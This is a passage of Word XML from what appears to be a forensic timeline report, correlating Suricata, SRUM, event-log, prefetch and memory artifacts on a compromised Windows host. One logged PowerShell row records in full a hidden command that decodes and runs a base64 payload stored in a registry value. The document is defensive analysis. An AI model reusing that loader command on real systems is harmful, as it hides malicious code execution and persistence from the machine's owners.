          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, F-016, F-017, F-031, T-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.783080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>high</w:t>
              <w:br/>
              <w:t>ET MALWARE Possible Metasploit Payload Common Construct Bind_API (from server) | TCP 203.78.103.109:443 -&gt; 10.42.85.115:50972 | A Network Trojan was detected | 1:shvkq1T5rI2BCKSFPByeBaHUCDE= | case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#455</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, F-017</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=618496/12288 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_AppResourceUseInfo_Output.csv#681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application resources)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: resource usage (end of period)</w:t>
              <w:br/>
              <w:t>\Device\HarddiskVolume3\Windows\System32\cmd.exe</w:t>
              <w:br/>
              <w:t>foreground read/written=484352/0 background read/written=0/0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_AppResourceUseInfo_Output.csv#682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>\device\harddiskvolume3\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>received=333817 sent=222046 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#190</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014, F-015, F-031</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (network usage per application)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>TermService</w:t>
              <w:br/>
              <w:t>received=1158782 sent=7120599 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#170</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-031</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.224593</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137\ricksanchez | LogonType 11 | LogonId: 0xB3CE02 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39826</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-002, F-023, T-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.224627</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4672 | Microsoft-Windows-Security-Auditing | Administrative logon | PrivilegeList: SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege | LogonId: 0xB3CE02</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39828</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15.421429</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\lsass.exe</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137\ricksanchez | LogonType 7 | LogonId: 0xB3CE80 | AuthenticationPackageName: Negotiate | LogonProcessName: Negotiat | C:\Windows\System32\lsass.exe | DESKTOP-SDN1RPT (-)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39830</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, psscan)</w:t>
              <w:br/>
              <w:t>powershell.exe</w:t>
              <w:br/>
              <w:t>PID=508 | PPID=1380 | ImageFileName=powershell.exe | SessionId=2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#101</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010, T-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.533172</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Shell-Core/Operational 9707 | Microsoft-Windows-Shell-Core | Started execution of command | q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#20011</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Shell-Core%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.656394</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>POWERSHELL.EXE</w:t>
              <w:br/>
              <w:t>runs=2 hash=CA1AE517 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#92</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\POWERSHELL.EXE-CA1AE517.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.674622</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Shell-Core/Operational 9708 | Microsoft-Windows-Shell-Core | Finished execution of command | PID: 1380 | q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#20012</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Shell-Core%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:39.658503</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 40961 | Microsoft-Windows-PowerShell</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#15073</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 600 | PowerShell | Provider is Started | HostApplication=powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=ConsoleHost</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=5.1.19041.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
